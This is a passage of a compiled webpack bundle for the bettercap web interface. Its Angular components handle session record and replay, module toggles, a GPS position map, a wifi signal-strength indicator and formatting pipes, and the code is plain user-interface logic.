            if (event instanceof _angular_router__WEBPACK_IMPORTED_MODULE_2__["NavigationStart"]) {
                _this.updateState(event.url);
            }
        });
        this.updateState(this.router.url);
        this.update();
        this.api.onNewData.subscribe(function (session) {
            _this.update();
            if (_this.restorePause) {
                _this.restorePause = false;
                _this.api.paused = true;
            }
        });
    };
    OmnibarComponent.prototype.showRecordModal = function () {
        $('#recordFile').val('~/bettercap-session.record');
        // https://stackoverflow.com/questions/10636667/bootstrap-modal-appearing-under-background
        $('#recordModal').appendTo('body').modal('show');
    };
    OmnibarComponent.prototype.doRecord = function () {
        $('#recordModal').modal('hide');
        var file = $('#recordFile').val();
        this.api.cmd("api.rest.record " + file);
    };
    OmnibarComponent.prototype.stopRecording = function () {
        this.api.cmd("api.rest.record off");
    };
    OmnibarComponent.prototype.showReplayModal = function () {
        $('#replayFile').val('~/bettercap-session.record');
        // https://stackoverflow.com/questions/10636667/bootstrap-modal-appearing-under-background
        $('#replayModal').appendTo('body').modal('show');
    };
    OmnibarComponent.prototype.doReplay = function () {
        $('#replayModal').modal('hide');
        var file = $('#replayFile').val();
        this.api.cmd("api.rest.replay " + file);
        this.rest.state.load_progress = 0.0;
        $('#loadingModal').appendTo('body').modal({
            backdrop: 'static',
            keyboard: false
        });
    };
    OmnibarComponent.prototype.curReplaytime = function () {
        var cur = new Date(Date.parse(this.api.session.polled_at));
        var start = new Date(Date.parse(this.rest.state.rec_started));
        var diff = cur.getTime() - start.getTime();
        return String(Math.floor(diff / 1000));
    };
    OmnibarComponent.prototype.setReplayFrame = function (frame) {
        this.rest.state.rec_cur_frame =
            this.api.sessionFrom =
                this.api.eventsFrom = frame;
        var wasPaused = this.api.paused;
        // unpause, wait for an update and restore pause if needed
        this.api.paused = false;
        if (wasPaused) {
            this.restorePause = true;
        }
    };
    OmnibarComponent.prototype.stopReplaying = function () {
        this.api.cmd("api.rest.replay off");
    };
    OmnibarComponent.prototype.replayPerc = function () {
        var perc = parseInt(String((this.rest.state.rec_cur_frame / this.rest.state.rec_frames) * 100));
        return String(perc);
    };
    OmnibarComponent.prototype.updateState = function (url) {
        this.modules = {};
        this.clearCmd = '';
        this.withCmd = true;
        this.withLimit = false;
        this.withIfaces = false;
        for (var path in this.configs) {
            if (url.indexOf(path) === 0) {
                for (var attr in this.configs[path]) {
                    this[attr] = this.configs[path][attr];
                }
                return;
            }
        }
    };
    OmnibarComponent.prototype.update = function () {
        this.rest = this.api.module('api.rest');
        if (this.rest.state.load_progress == 100.0) {
            $('#loadingModal').modal('hide');
        }
        handlers = [];
        params = [];
        for (var i = 0; i < this.api.session.modules.length; i++) {
            var mod = this.api.session.modules[i];
            this.enabled[mod.name] = mod.running;
            for (var j = 0; j < mod.handlers.length; j++) {
                handlers.push(mod.handlers[j].name);
            }
            for (var name_1 in mod.parameters) {
                params.push(mod.parameters[name_1].name);
            }
        }
        this.ifaces = [];
        for (var i = 0; i < this.api.session.interfaces.length; i++) {
            var iface = this.api.session.interfaces[i];
            if (iface.addresses.length == 0 && !iface.flags.includes('LOOPBACK')) {
                this.ifaces.push(iface);
            }
        }
    };
    OmnibarComponent.prototype.ngOnDestroy = function () {
    };
    OmnibarComponent.prototype.onClearClicked = function () {
        if (confirm("This will clear the records from both the API and the UI, continue?")) {
            this.api.cmd(this.clearCmd);
        }
    };
    OmnibarComponent.prototype.isWifiIface = function (iface) {
        var wif = this.api.session.env.data['wifi.interface'];
        if (wif == '') {
            return iface.name == this.api.session.interface.hostname;
        }
        return iface.name == wif;
    };
    OmnibarComponent.prototype.onSetWifiInterface = function (name) {
        this.api.cmd('set wifi.interface ' + name);
        this.toastr.info("Set wifi.interface to " + name);
    };
    OmnibarComponent.prototype.onModuleToggleClicked = function (mod) {
        this.update();
        var toggle = this.enabled[mod.key] ? 'off' : 'on';
        var selected = $('#wifiiface').val();
        var bar = this;
        var cb = function () {
            bar.enabled[mod.key] = !bar.enabled[mod.key];
            bar.api.cmd(mod.value + ' ' + toggle);
        };
        if (selected && toggle == 'on' && this.withIfaces) {
            this.api.cmd('set wifi.interface ' + selected, true).subscribe(function (val) {
                cb();
            }, function (error) {
                cb();
            }, function () { });
        }
        else {
            cb();
        }
    };
    OmnibarComponent.prototype.searchCommand = function (text$) {
        return text$.pipe(Object(rxjs_operators__WEBPACK_IMPORTED_MODULE_3__["distinctUntilChanged"])(), Object(rxjs_operators__WEBPACK_IMPORTED_MODULE_3__["map"])(function (term) {
            if (term.length < 2)
                return [];
            var lwr = term.toLowerCase();
            if (lwr.indexOf('set ') === 0) {
                var par_1 = lwr.substring(4);
                return params
                    .filter(function (p) { return p.toLowerCase().indexOf(par_1) > -1; })
                    .map(function (p) { return 'set ' + p; });
            }
            return handlers.filter(function (h) { return h.toLowerCase().indexOf(lwr) > -1; });
        }));
    };
    OmnibarComponent.prototype.onCmd = function () {
        var cmd = this.cmd.trim();
        if (cmd.length > 0) {
            this.cmd = '';
            this.api.cmd(cmd);
        }
    };
    OmnibarComponent = tslib__WEBPACK_IMPORTED_MODULE_0__["__decorate"]([
        Object(_angular_core__WEBPACK_IMPORTED_MODULE_1__["Component"])({
            selector: 'omnibar',
            template: __webpack_require__(/*! ./omnibar.component.html */ "./src/app/components/omnibar/omnibar.component.html"),
            styles: [__webpack_require__(/*! ./omnibar.component.scss */ "./src/app/components/omnibar/omnibar.component.scss")]
        }),
        tslib__WEBPACK_IMPORTED_MODULE_0__["__metadata"]("design:paramtypes", [_services_omnibar_service__WEBPACK_IMPORTED_MODULE_4__["OmniBarService"], _services_api_service__WEBPACK_IMPORTED_MODULE_5__["ApiService"], ngx_toastr__WEBPACK_IMPORTED_MODULE_6__["ToastrService"], _angular_router__WEBPACK_IMPORTED_MODULE_2__["Router"]])
    ], OmnibarComponent);
    return OmnibarComponent;
}());



/***/ }),

/***/ "./src/app/components/position/position.component.html":
/*!*************************************************************!*\
  !*** ./src/app/components/position/position.component.html ***!
  \*************************************************************/
/*! no static exports found */
/***/ (function(module, exports) {

module.exports = "<div style=\"height:100%\">\n\n  <table class=\"table table-sm table-dark\">\n    <tbody>\n      <tr>\n        <td with=\"1%\" *ngIf=\"!running\">\n          <span class=\"badge badge-danger\">\n            Not running\n          </span> \n        </td>\n\n        <ng-container *ngIf=\"running\">\n          <td with=\"1%\" *ngIf=\"api.session.gps.NumSatellites == 0\">\n            <span class=\"badge badge-danger\">\n              No satellites\n            </span> \n          </td>\n\n          <th with=\"1%\" *ngIf=\"api.session.gps.NumSatellites > 0\">Updated</th>\n          <td *ngIf=\"api.session.gps.NumSatellites > 0\">\n            {{ api.session.gps.Updated | date:'HH:mm:ss' }} \n          </td>\n\n          <ng-container *ngFor=\"let gps of api.session.gps | keyvalue\">\n            <ng-container *ngIf=\"gps.key != 'NumSatellites' && gps.key != 'Updated'\">\n              <th with=\"1%\">{{ gps.key }}</th>\n              <td>{{ gps.value }}</td>\n            </ng-container>\n          </ng-container>\n        </ng-container>\n\n      </tr>\n    </tbody>\n  </table>\n\n  <div id=\"map\" class=\"map\" [hidden]=\"!running\"></div>\n</div>\n"

/***/ }),

/***/ "./src/app/components/position/position.component.scss":
/*!*************************************************************!*\
  !*** ./src/app/components/position/position.component.scss ***!
  \*************************************************************/
/*! no static exports found */
/***/ (function(module, exports) {

module.exports = "div.map {\n  width: 100%;\n  height: 95%;\n}\n/*# sourceMappingURL=data:application/json;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbIi9Vc2Vycy9ldmlsc29ja2V0L0JhaGFtdXQvTGFiL2JldHRlcmNhcC91aS9zcmMvYXBwL2NvbXBvbmVudHMvcG9zaXRpb24vcG9zaXRpb24uY29tcG9uZW50LnNjc3MiLCJzcmMvYXBwL2NvbXBvbmVudHMvcG9zaXRpb24vcG9zaXRpb24uY29tcG9uZW50LnNjc3MiXSwibmFtZXMiOltdLCJtYXBwaW5ncyI6IkFBQUE7RUFDSSxXQUFBO0VBQ0EsV0FBQTtBQ0NKIiwiZmlsZSI6InNyYy9hcHAvY29tcG9uZW50cy9wb3NpdGlvbi9wb3NpdGlvbi5jb21wb25lbnQuc2NzcyIsInNvdXJjZXNDb250ZW50IjpbImRpdi5tYXAge1xuICAgIHdpZHRoOiAxMDAlO1xuICAgIGhlaWdodDogOTUlO1xufVxuIiwiZGl2Lm1hcCB7XG4gIHdpZHRoOiAxMDAlO1xuICBoZWlnaHQ6IDk1JTtcbn0iXX0= */"

/***/ }),

/***/ "./src/app/components/position/position.component.ts":
/*!***********************************************************!*\
  !*** ./src/app/components/position/position.component.ts ***!
  \***********************************************************/
/*! exports provided: PositionComponent */
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
__webpack_require__.r(__webpack_exports__);
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "PositionComponent", function() { return PositionComponent; });
/* harmony import */ var tslib__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! tslib */ "./node_modules/tslib/tslib.es6.js");
/* harmony import */ var _angular_core__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! @angular/core */ "./node_modules/@angular/core/fesm5/core.js");
/* harmony import */ var _services_api_service__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(/*! ../../services/api.service */ "./src/app/services/api.service.ts");
/* harmony import */ var _services_omnibar_service__WEBPACK_IMPORTED_MODULE_3__ = __webpack_require__(/*! ../../services/omnibar.service */ "./src/app/services/omnibar.service.ts");




var PositionComponent = /** @class */ (function () {
    function PositionComponent(api, omnibar) {
        this.api = api;
        this.omnibar = omnibar;
        this.running = false;
        this.subscriptions = [];
        this.update();
    }
    PositionComponent.prototype.ngOnInit = function () {
        var _this = this;
        this.subscriptions = [
            this.api.onNewData.subscribe(function (session) {
                _this.update();
            })
        ];
        this.map = new ol.Map({
            target: 'map',
            layers: [
                new ol.layer.Tile({
                    source: new ol.source.OSM()
                })
            ],
            view: new ol.View({
                center: ol.proj.fromLonLat([this.api.session.gps.Longitude, this.api.session.gps.Latitude]),
                zoom: 18
            })
        });
        this.addMarker(this.api.session.gps.Latitude, this.api.session.gps.Longitude);
    };
    PositionComponent.prototype.ngOnDestroy = function () {
        for (var i = 0; i < this.subscriptions.length; i++) {
            this.subscriptions[i].unsubscribe();
        }
        this.subscriptions = [];
    };
    PositionComponent.prototype.addMarker = function (lat, lng) {
        var iconMarkerStyle = new ol.style.Style({
            image: new ol.style.Icon({
                opacity: 1.0,
                scale: 0.1,
                src: '/assets/images/logo.png'
            })
        });
        var vectorLayer = new ol.layer.Vector({
            source: new ol.source.Vector({
                features: [new ol.Feature({
                        geometry: new ol.geom.Point(ol.proj.transform([lng, lat], 'EPSG:4326', 'EPSG:3857')),
                    })]
            }),
            style: iconMarkerStyle
        });
        if (this.prevMarker) {
            this.map.removeLayer(this.prevMarker);
        }
        this.map.addLayer(vectorLayer);
        this.prevMarker = vectorLayer;
    };
    /*
    https://www.maps.ie/map-my-route/

    idx: number = 0;
    steps: any = [
        [40.861793161679294,-73.04730981588365],[40.861793,-73.047311],[40.862143,-73.04736],[40.862143,-73.04736],[40.862492,-73.047415],[40.862492,-73.047415],[40.862842,-73.047465],[40.862842,-73.047465],[40.863002,-73.047493],[40.863002,-73.047493],[40.863337,-73.04756],[40.863337,-73.04756],[40.863593,-73.047618],[40.863593,-73.047618],[40.863881,-73.047683],[40.863891,-73.047619],[40.863891,-73.047619],[40.863881,-73.047683],[40.864028,-73.047655],[40.86417,-73.047699],[40.86417,-73.047699],[40.86441,-73.047774],[40.864478,-73.04785],[40.864477,-73.04775],[40.864477,-73.04775],[40.864478,-73.04785],[40.864809,-73.047897],[40.864809,-73.047897],[40.865154,-73.047946],[40.865154,-73.047946],[40.865536,-73.048015],[40.865536,-73.048015],[40.865798,-73.048062],[40.865808,-73.047966],[40.865808,-73.047966],[40.865851,-73.047547],[40.865851,-73.047547],[40.865907,-73.047013],[40.865907,-73.047013],[40.865959,-73.046432],[40.865959,-73.046432],[40.86598,-73.046222],[40.866253,-73.046266],[40.866253,-73.046266],[40.866527,-73.046309],[40.866527,-73.046309],[40.866741,-73.046424],[40.866775,-73.046513],[40.866771,-73.046557],[40.866771,-73.046557],[40.866715,-73.047177],[40.866715,-73.047177],[40.866682,-73.047523],[40.866682,-73.047523],[40.86666,-73.0476],[40.866528,-73.047892],[40.866528,-73.047892],[40.866477,-73.048318],[40.866477,-73.048318],[40.86644,-73.048698],[40.86644,-73.048698],[40.866401,-73.0491],[40.866401,-73.0491],[40.866349,-73.049643],[40.866349,-73.049643],[40.86633,-73.049841],[40.866261,-73.049828],[40.866261,-73.049828],[40.866151,-73.049807],[40.866151,-73.049807],[40.865965,-73.049772],[40.865965,-73.049772],[40.865747,-73.04973],[40.865747,-73.04973],[40.865402,-73.049664],[40.865402,-73.049664],[40.865034,-73.049664],[40.865034,-73.049664],[40.865005,-73.049665],[40.864982,-73.049925],[40.864982,-73.049925],[40.864939,-73.050328],[40.864939,-73.050328],[40.864922,-73.050414],[40.864824,-73.050632],[40.864723,-73.05079],[40.864723,-73.05079],[40.864586,-73.051003],[40.864586,-73.051003],[40.86468,-73.050856],[40.864367,-73.050821],[40.864367,-73.050821],[40.86468,-73.050856],[40.864824,-73.050632],[40.864113,-73.050546],[40.864113,-73.050546],[40.864005,-73.050533],[40.864005,-73.050533],[40.864005,-73.050533]
    ];
    */
    PositionComponent.prototype.update = function () {
        this.running = this.api.module('gps').running;
        if (this.map) {
            /*
            let step = this.steps[this.idx++ % this.steps.length];
            this.api.session.gps.Longitude = step[1];
            this.api.session.gps.Latitude = step[0];
            */
            this.addMarker(this.api.session.gps.Latitude, this.api.session.gps.Longitude);
            var view = this.map.getView();
            view.setCenter(ol.proj.fromLonLat([this.api.session.gps.Longitude, this.api.session.gps.Latitude]));
        }
    };
    PositionComponent = tslib__WEBPACK_IMPORTED_MODULE_0__["__decorate"]([
        Object(_angular_core__WEBPACK_IMPORTED_MODULE_1__["Component"])({
            selector: 'ui-position',
            template: __webpack_require__(/*! ./position.component.html */ "./src/app/components/position/position.component.html"),
            styles: [__webpack_require__(/*! ./position.component.scss */ "./src/app/components/position/position.component.scss")]
        }),
        tslib__WEBPACK_IMPORTED_MODULE_0__["__metadata"]("design:paramtypes", [_services_api_service__WEBPACK_IMPORTED_MODULE_2__["ApiService"], _services_omnibar_service__WEBPACK_IMPORTED_MODULE_3__["OmniBarService"]])
    ], PositionComponent);
    return PositionComponent;
}());



/***/ }),

/***/ "./src/app/components/rectime.pipe.ts":
/*!********************************************!*\
  !*** ./src/app/components/rectime.pipe.ts ***!
  \********************************************/
/*! exports provided: RecTimePipe */
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
__webpack_require__.r(__webpack_exports__);
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "RecTimePipe", function() { return RecTimePipe; });
/* harmony import */ var tslib__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! tslib */ "./node_modules/tslib/tslib.es6.js");
/* harmony import */ var _angular_core__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! @angular/core */ "./node_modules/@angular/core/fesm5/core.js");


var RecTimePipe = /** @class */ (function () {
    function RecTimePipe() {
    }
    // https://www.tutorialspoint.com/How-to-convert-seconds-to-HH-MM-SS-with-JavaScript
    RecTimePipe.prototype.transform = function (sec) {
        if (sec === void 0) { sec = 0; }
        var hrs = Math.floor(sec / 3600);
        var min = Math.floor((sec - (hrs * 3600)) / 60);
        var seconds = sec - (hrs * 3600) - (min * 60);
        seconds = Math.round(seconds * 100) / 100;
        var result = String(hrs < 10 ? "0" + hrs : hrs);
        result += ":" + (min < 10 ? "0" + min : min);
        result += ":" + (seconds < 10 ? "0" + seconds : seconds);
        return result;
    };
    RecTimePipe = tslib__WEBPACK_IMPORTED_MODULE_0__["__decorate"]([
        Object(_angular_core__WEBPACK_IMPORTED_MODULE_1__["Pipe"])({ name: 'rectime' })
    ], RecTimePipe);
    return RecTimePipe;
}());



/***/ }),

/***/ "./src/app/components/search.pipe.ts":
/*!*******************************************!*\
  !*** ./src/app/components/search.pipe.ts ***!
  \*******************************************/
/*! exports provided: SearchPipe */
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
__webpack_require__.r(__webpack_exports__);
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "SearchPipe", function() { return SearchPipe; });
/* harmony import */ var tslib__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! tslib */ "./node_modules/tslib/tslib.es6.js");
/* harmony import */ var _angular_core__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! @angular/core */ "./node_modules/@angular/core/fesm5/core.js");


var SearchPipe = /** @class */ (function () {
    function SearchPipe() {
    }
    SearchPipe.prototype.transform = function (values, term) {
        return values.filter(function (x) {
            if (term.length < 3)
                return true;
            term = term.toLowerCase();
            for (var field in x) {
                var val = JSON.stringify(x[field]);
                if (val.toLowerCase().includes(term)) {
                    return true;
                }
            }
            return false;
        });
    };
    SearchPipe = tslib__WEBPACK_IMPORTED_MODULE_0__["__decorate"]([
        Object(_angular_core__WEBPACK_IMPORTED_MODULE_1__["Pipe"])({ name: 'search' })
    ], SearchPipe);
    return SearchPipe;
}());



/***/ }),

/***/ "./src/app/components/signal-indicator/signal-indicator.component.html":
/*!*****************************************************************************!*\
  !*** ./src/app/components/signal-indicator/signal-indicator.component.html ***!
  \*****************************************************************************/
/*! no static exports found */
/***/ (function(module, exports) {

module.exports = "<div class=\"signal-indicator--wrapper\" placement=\"right\" ngbTooltip=\"{{ signalstrength + ' dBm' }}\" [ngClass]=\"{\n 'step__1': signal === 1,\n 'step__2': signal === 2,\n 'step__3': signal === 3,\n 'step__4': signal === 4\n }\">\n  <span class=\"signal-indicator--step signal-indicator__step1\" [class.currentStep]=\"signal >= 1\"></span>\n  <span class=\"signal-indicator--step signal-indicator__step2\" [class.currentStep]=\"signal >= 2\"></span>\n  <span class=\"signal-indicator--step signal-indicator__step3\" [class.currentStep]=\"signal >= 3\"></span>\n  <span class=\"signal-indicator--step signal-indicator__step4\" [class.currentStep]=\"signal === 4\"></span>\n</div>\n"

/***/ }),

/***/ "./src/app/components/signal-indicator/signal-indicator.component.scss":
/*!*****************************************************************************!*\
  !*** ./src/app/components/signal-indicator/signal-indicator.component.scss ***!
  \*****************************************************************************/
/*! no static exports found */
/***/ (function(module, exports) {

module.exports = ".signal-indicator--wrapper {\n  width: 30px;\n  display: table-cell;\n}\n.signal-indicator--wrapper:after {\n  content: \"\";\n  display: table;\n  clear: both;\n}\n.signal-indicator--wrapper .signal-indicator--step {\n  display: inline-block;\n  background-color: #32383e;\n  width: 5px;\n  transition: height 0.2s ease-in-out;\n  margin-right: 3px;\n  margin-bottom: 4px;\n  vertical-align: bottom;\n}\n.signal-indicator--wrapper .signal-indicator--step:last-child {\n  margin-right: 0;\n}\n.signal-indicator--wrapper .signal-indicator--step.signal-indicator__step1 {\n  height: 2px;\n}\n.signal-indicator--wrapper .signal-indicator--step.signal-indicator__step2 {\n  height: 5px;\n}\n.signal-indicator--wrapper .signal-indicator--step.signal-indicator__step3 {\n  height: 10px;\n}\n.signal-indicator--wrapper .signal-indicator--step.signal-indicator__step4 {\n  height: 15px;\n}\n.signal-indicator--wrapper.step__1 .currentStep {\n  background-color: red;\n}\n.signal-indicator--wrapper.step__2 .currentStep {\n  background-color: yellow;\n}\n.signal-indicator--wrapper.step__3 .currentStep {\n  background-color: yellowgreen;\n}\n.signal-indicator--wrapper.step__4 .currentStep {\n  background-color: green;\n}\n/*# sourceMappingURL=data:application/json;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbIi9Vc2Vycy9ldmlsc29ja2V0L0JhaGFtdXQvTGFiL2JldHRlcmNhcC91aS9zcmMvYXBwL2NvbXBvbmVudHMvc2lnbmFsLWluZGljYXRvci9zaWduYWwtaW5kaWNhdG9yLmNvbXBvbmVudC5zY3NzIiwic3JjL2FwcC9jb21wb25lbnRzL3NpZ25hbC1pbmRpY2F0b3Ivc2lnbmFsLWluZGljYXRvci5jb21wb25lbnQuc2NzcyJdLCJuYW1lcyI6W10sIm1hcHBpbmdzIjoiQUFBQTtFQU1FLFdBQUE7RUFDQSxtQkFBQTtBQ0pGO0FERkU7RUFDRSxXQUFBO0VBQ0EsY0FBQTtFQUNBLFdBQUE7QUNJSjtBREFFO0VBQ0UscUJBQUE7RUFDQSx5QkFBQTtFQUNBLFVBQUE7RUFDQSxtQ0FBQTtFQUNBLGlCQUFBO0VBQ0Esa0JBQUE7RUFDQSxzQkFBQTtBQ0VKO0FEREk7RUFDRSxlQUFBO0FDR047QURESTtFQUNFLFdBQUE7QUNHTjtBRERJO0VBQ0UsV0FBQTtBQ0dOO0FEREk7RUFDRSxZQUFBO0FDR047QURESTtFQUNFLFlBQUE7QUNHTjtBRENJO0VBQ0UscUJBQUE7QUNDTjtBREdJO0VBQ0Usd0JBQUE7QUNETjtBREtJO0VBQ0UsNkJBQUE7QUNITjtBRE9JO0VBQ0UsdUJBQUE7QUNMTiIsImZpbGUiOiJzcmMvYXBwL2NvbXBvbmVudHMvc2lnbmFsLWluZGljYXRvci9zaWduYWwtaW5kaWNhdG9yLmNvbXBvbmVudC5zY3NzIiwic291cmNlc0NvbnRlbnQiOlsiLnNpZ25hbC1pbmRpY2F0b3ItLXdyYXBwZXIge1xuICAmOmFmdGVyIHtcbiAgICBjb250ZW50OiAnJztcbiAgICBkaXNwbGF5OnRhYmxlO1xuICAgIGNsZWFyOmJvdGg7XG4gIH1cbiAgd2lkdGg6MzBweDtcbiAgZGlzcGxheTp0YWJsZS1jZWxsO1xuICAuc2lnbmFsLWluZGljYXRvci0tc3RlcCB7XG4gICAgZGlzcGxheTppbmxpbmUtYmxvY2s7XG4gICAgYmFja2dyb3VuZC1jb2xvcjojMzIzODNlO1xuICAgIHdpZHRoOjVweDtcbiAgICB0cmFuc2l0aW9uOiBoZWlnaHQgLjJzIGVhc2UtaW4tb3V0O1xuICAgIG1hcmdpbi1yaWdodDozcHg7XG4gICAgbWFyZ2luLWJvdHRvbTogNHB4O1xuICAgIHZlcnRpY2FsLWFsaWduOiBib3R0b207XG4gICAgJjpsYXN0LWNoaWxkIHtcbiAgICAgIG1hcmdpbi1yaWdodDowO1xuICAgIH1cbiAgICAmLnNpZ25hbC1pbmRpY2F0b3JfX3N0ZXAxe1xuICAgICAgaGVpZ2h0OjJweDtcbiAgICB9XG4gICAgJi5zaWduYWwtaW5kaWNhdG9yX19zdGVwMntcbiAgICAgIGhlaWdodDo1cHg7XG4gICAgfVxuICAgICYuc2lnbmFsLWluZGljYXRvcl9fc3RlcDN7XG4gICAgICBoZWlnaHQ6MTBweDtcbiAgICB9XG4gICAgJi5zaWduYWwtaW5kaWNhdG9yX19zdGVwNHtcbiAgICAgIGhlaWdodDoxNXB4O1xuICAgIH1cbiAgfVxuICAmLnN0ZXBfXzF7XG4gICAgLmN1cnJlbnRTdGVwIHtcbiAgICAgIGJhY2tncm91bmQtY29sb3I6cmVkO1xuICAgIH1cbiAgfVxuICAmLnN0ZXBfXzJ7XG4gICAgLmN1cnJlbnRTdGVwIHtcbiAgICAgIGJhY2tncm91bmQtY29sb3I6eWVsbG93O1xuICAgIH1cbiAgfVxuICAmLnN0ZXBfXzN7XG4gICAgLmN1cnJlbnRTdGVwIHtcbiAgICAgIGJhY2tncm91bmQtY29sb3I6eWVsbG93Z3JlZW47XG4gICAgfVxuICB9XG4gICYuc3RlcF9fNHtcbiAgICAuY3VycmVudFN0ZXAge1xuICAgICAgYmFja2dyb3VuZC1jb2xvcjpncmVlbjtcbiAgICB9XG4gIH1cbn1cbiIsIi5zaWduYWwtaW5kaWNhdG9yLS13cmFwcGVyIHtcbiAgd2lkdGg6IDMwcHg7XG4gIGRpc3BsYXk6IHRhYmxlLWNlbGw7XG59XG4uc2lnbmFsLWluZGljYXRvci0td3JhcHBlcjphZnRlciB7XG4gIGNvbnRlbnQ6IFwiXCI7XG4gIGRpc3BsYXk6IHRhYmxlO1xuICBjbGVhcjogYm90aDtcbn1cbi5zaWduYWwtaW5kaWNhdG9yLS13cmFwcGVyIC5zaWduYWwtaW5kaWNhdG9yLS1zdGVwIHtcbiAgZGlzcGxheTogaW5saW5lLWJsb2NrO1xuICBiYWNrZ3JvdW5kLWNvbG9yOiAjMzIzODNlO1xuICB3aWR0aDogNXB4O1xuICB0cmFuc2l0aW9uOiBoZWlnaHQgMC4ycyBlYXNlLWluLW91dDtcbiAgbWFyZ2luLXJpZ2h0OiAzcHg7XG4gIG1hcmdpbi1ib3R0b206IDRweDtcbiAgdmVydGljYWwtYWxpZ246IGJvdHRvbTtcbn1cbi5zaWduYWwtaW5kaWNhdG9yLS13cmFwcGVyIC5zaWduYWwtaW5kaWNhdG9yLS1zdGVwOmxhc3QtY2hpbGQge1xuICBtYXJnaW4tcmlnaHQ6IDA7XG59XG4uc2lnbmFsLWluZGljYXRvci0td3JhcHBlciAuc2lnbmFsLWluZGljYXRvci0tc3RlcC5zaWduYWwtaW5kaWNhdG9yX19zdGVwMSB7XG4gIGhlaWdodDogMnB4O1xufVxuLnNpZ25hbC1pbmRpY2F0b3ItLXdyYXBwZXIgLnNpZ25hbC1pbmRpY2F0b3ItLXN0ZXAuc2lnbmFsLWluZGljYXRvcl9fc3RlcDIge1xuICBoZWlnaHQ6IDVweDtcbn1cbi5zaWduYWwtaW5kaWNhdG9yLS13cmFwcGVyIC5zaWduYWwtaW5kaWNhdG9yLS1zdGVwLnNpZ25hbC1pbmRpY2F0b3JfX3N0ZXAzIHtcbiAgaGVpZ2h0OiAxMHB4O1xufVxuLnNpZ25hbC1pbmRpY2F0b3ItLXdyYXBwZXIgLnNpZ25hbC1pbmRpY2F0b3ItLXN0ZXAuc2lnbmFsLWluZGljYXRvcl9fc3RlcDQge1xuICBoZWlnaHQ6IDE1cHg7XG59XG4uc2lnbmFsLWluZGljYXRvci0td3JhcHBlci5zdGVwX18xIC5jdXJyZW50U3RlcCB7XG4gIGJhY2tncm91bmQtY29sb3I6IHJlZDtcbn1cbi5zaWduYWwtaW5kaWNhdG9yLS13cmFwcGVyLnN0ZXBfXzIgLmN1cnJlbnRTdGVwIHtcbiAgYmFja2dyb3VuZC1jb2xvcjogeWVsbG93O1xufVxuLnNpZ25hbC1pbmRpY2F0b3ItLXdyYXBwZXIuc3RlcF9fMyAuY3VycmVudFN0ZXAge1xuICBiYWNrZ3JvdW5kLWNvbG9yOiB5ZWxsb3dncmVlbjtcbn1cbi5zaWduYWwtaW5kaWNhdG9yLS13cmFwcGVyLnN0ZXBfXzQgLmN1cnJlbnRTdGVwIHtcbiAgYmFja2dyb3VuZC1jb2xvcjogZ3JlZW47XG59Il19 */"

/***/ }),

/***/ "./src/app/components/signal-indicator/signal-indicator.component.ts":
/*!***************************************************************************!*\
  !*** ./src/app/components/signal-indicator/signal-indicator.component.ts ***!
  \***************************************************************************/
/*! exports provided: SignalIndicatorComponent */
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
__webpack_require__.r(__webpack_exports__);
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "SignalIndicatorComponent", function() { return SignalIndicatorComponent; });
/* harmony import */ var tslib__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! tslib */ "./node_modules/tslib/tslib.es6.js");
/* harmony import */ var _angular_core__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! @angular/core */ "./node_modules/@angular/core/fesm5/core.js");


var SignalIndicatorComponent = /** @class */ (function () {
    function SignalIndicatorComponent() {
        this.signal = 0;
    }
    SignalIndicatorComponent.prototype.ngOnChanges = function (changes) {
        if (changes.signalstrength) {
            this.signal = this._calculateStrength(changes.signalstrength.currentValue);
        }
    };
    // ref. https://www.metageek.com/training/resources/understanding-rssi-2.html
    SignalIndicatorComponent.prototype._calculateStrength = function (value) {
        if (value >= -67)
            return 4;
        else if (value >= -70)
            return 3;
        else if (value >= -80)
            return 2;
        else
            return 1;
    };
    tslib__WEBPACK_IMPORTED_MODULE_0__["__decorate"]([
        Object(_angular_core__WEBPACK_IMPORTED_MODULE_1__["Input"])(),
        tslib__WEBPACK_IMPORTED_MODULE_0__["__metadata"]("design:type", Number)
    ], SignalIndicatorComponent.prototype, "signalstrength", void 0);
    SignalIndicatorComponent = tslib__WEBPACK_IMPORTED_MODULE_0__["__decorate"]([
        Object(_angular_core__WEBPACK_IMPORTED_MODULE_1__["Component"])({
            selector: 'ui-signal-indicator',
            template: __webpack_require__(/*! ./signal-indicator.component.html */ "./src/app/components/signal-indicator/signal-indicator.component.html"),
            styles: [__webpack_require__(/*! ./signal-indicator.component.scss */ "./src/app/components/signal-indicator/signal-indicator.component.scss")]
        }),
        tslib__WEBPACK_IMPORTED_MODULE_0__["__metadata"]("design:paramtypes", [])
    ], SignalIndicatorComponent);
    return SignalIndicatorComponent;
}());



/***/ }),

/***/ "./src/app/components/size.pipe.ts":
/*!*****************************************!*\
  !*** ./src/app/components/size.pipe.ts ***!
  \*****************************************/
/*! exports provided: SizePipe */
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
__webpack_require__.r(__webpack_exports__);
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "SizePipe", function() { return SizePipe; });
/* harmony import */ var tslib__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! tslib */ "./node_modules/tslib/tslib.es6.js");
/* harmony import */ var _angular_core__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! @angular/core */ "./node_modules/@angular/core/fesm5/core.js");


var SizePipe = /** @class */ (function () {
    function SizePipe() {
        this.units = [
            'B',
            'KB',
            'MB',
            'GB',
